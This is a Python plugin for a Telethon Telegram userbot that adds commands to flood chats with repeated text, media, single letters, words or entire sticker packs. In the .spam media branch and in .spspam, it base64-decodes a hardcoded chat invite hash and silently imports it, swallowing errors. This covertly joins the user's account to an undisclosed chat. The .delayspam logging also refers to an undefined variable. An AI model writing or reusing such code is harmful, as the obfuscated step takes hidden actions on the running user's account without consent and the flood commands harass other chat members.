import asyncio
import base64

from telethon.tl import functions, types
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl.types import InputStickerSetID

from . import BOTLOG, BOTLOG_CHATID


@bot.on(admin_cmd(pattern="spam (.*)"))
@bot.on(sudo_cmd(pattern="spam (.*)", allow_sudo=True))
async def spammer(event):
    if event.fwd_from:
        return
    await reply_id(event)
    sandy = await event.get_reply_message()
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    if len(cat) == 2:
        spam_message = str(("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
        await event.delete()
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        await event.delete()
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(event.chat_id, sandy)
            await unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass
        if BOTLOG:
            if event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} times with below message",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) with {counter} times with below message",
                )
            sandy = await event.client.send_file(BOTLOG_CHATID, sandy)
            await unsavegif(event, sandy)
        return
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPAM\n"
                + f"Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} messages of \n"
                + f"`{spam_message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPAM\n"
                + f"Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat  with {counter} messages of \n"
                + f"`{spam_message}`",
            )


@bot.on(admin_cmd(pattern="spspam$"))
@bot.on(sudo_cmd(pattern="spspam$", allow_sudo=True))
async def stickerpack_spam(event):
    if event.fwd_from:
        return
    reply = await event.get_reply_message()
    if not reply or media_type(reply) is None or media_type(reply) != "Sticker":
        return await edit_delete(
            event, "`reply to any sticker to send all stickers in that pack`"
        )
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    try:
        stickerset_attr = reply.document.attributes[1]
        catevent = await edit_or_reply(
            event, "`Fetching details of the sticker pack, please wait..`"
        )
    except BaseException:
        await edit_delete(event, "`This is not a sticker. Reply to a sticker.`", 5)
        return
    try:
        get_stickerset = await event.client(
            GetStickerSetRequest(
                InputStickerSetID(
                    id=stickerset_attr.stickerset.id,
                    access_hash=stickerset_attr.stickerset.access_hash,
                )
            )
        )
    except:
        return await edit_delete(
            catevent,
            "`I guess this sticker is not part of any pack so i cant kang this sticker pack try kang for this sticker`",
        )
    try:
        hmm = Get(hmm)
        await event.client(hmm)
    except BaseException:
        pass
    reqd_sticker_set = await event.client(
        functions.messages.GetStickerSetRequest(
            stickerset=types.InputStickerSetShortName(
                short_name=f"{get_stickerset.set.short_name}"
            )
        )
    )
    for m in reqd_sticker_set.documents:
        await event.client.send_file(event.chat_id, m)
        await asyncio.sleep(0.7)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPSPAM\n"
                + f"Sticker Pack Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with pack ",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPSPAM\n"
                + f"Sticker Pack Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with pack",
            )
        await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])


@bot.on(admin_cmd("cspam (.*)"))
@bot.on(sudo_cmd(pattern="cspam (.*)", allow_sudo=True))
async def tmeme(event):
    cspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = cspam.replace(" ", "")
    await event.delete()
    for letter in message:
        await event.respond(letter)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with : `{message}`",
            )


@bot.on(admin_cmd("wspam (.*)"))
@bot.on(sudo_cmd(pattern="wspam (.*)", allow_sudo=True))
async def tmeme(event):
    wspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = wspam.split()
    await event.delete()
    for word in message:
        await event.respond(word)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with : `{message}`",
            )


@bot.on(admin_cmd("delayspam (.*)"))
@bot.on(sudo_cmd(pattern="delayspam (.*)", allow_sudo=True))
async def spammer(event):
    if event.fwd_from:
        return
    input_str = "".join(event.text.split(maxsplit=1)[1:])
    spamDelay = float(input_str.split(" ", 2)[0])
    counter = int(input_str.split(" ", 2)[1])
    spam_message = str(input_str.split(" ", 2)[2])
    await event.delete()
    for _ in range(counter):
        await event.respond(spam_message)
        await asyncio.sleep(spamDelay)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#DELAYSPAM\n"
                + f"Delay Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {spamDelay}s Delay and {counter} times with : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#DELAYCSPAM\n"
                + f"Delay Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with {spamDelay}s Delay and {counter} times with: `{message}`",
            )


CMD_HELP.update(
    {
        "spam": "__**PLUGIN NAME :** Spam__\
\n\n📌** CMD ➥** `.cspam` <text>\
\n**USAGE   ➥  **Spam the text letter by letter.\
\n\n📌** CMD ➥** `.spam` <count> <text>\
\n**USAGE   ➥  **Floods text in the chat !!\
\n\n📌** CMD ➥** `.spam` <count> replay to media\
\n**USAGE   ➥  **Floods text in the media !!\
\n\n📌** CMD ➥** `.wspam` <text>\
\n**USAGE   ➥  **Spam the text word by word.\
\n\n📌** CMD ➥** `.delayspam` <delay> <count> <text>\
\n**USAGE   ➥  **Delayspam with custom delay.\
\n\n\n**NOTE : Spam at your own risk !!**"
    }
)
